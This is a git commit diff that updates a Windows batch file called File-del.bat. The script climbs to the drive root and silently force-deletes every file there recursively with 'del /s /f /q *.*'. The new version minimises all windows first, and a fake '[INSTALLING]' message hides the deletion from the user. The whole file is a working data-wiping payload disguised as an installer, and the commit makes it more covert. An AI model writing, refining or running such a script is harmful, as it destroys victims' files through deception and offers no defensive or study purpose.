eb4c49b0ed00c5a75391070ec6c6f794ad322ab2
Vtos1957 <wafflesguy12345@gmail.com>
2026-08-13 20:07:59 -0600

    Update File-del.bat

--- File-del.bat
+++ File-del.bat
@@ -1,5 +1,5 @@
 @echo off
-start cmd /k "cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & del /s /f /q *.* >nul 2>&1"
+start cmd /k "cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()" &del /s /f /q *.* >nul 2>&1"
 :a
 echo [INSTALLING] This may take a while.
 timeout /t 1 | findstr "gdrg78hgruihg74hguie4tguyg"
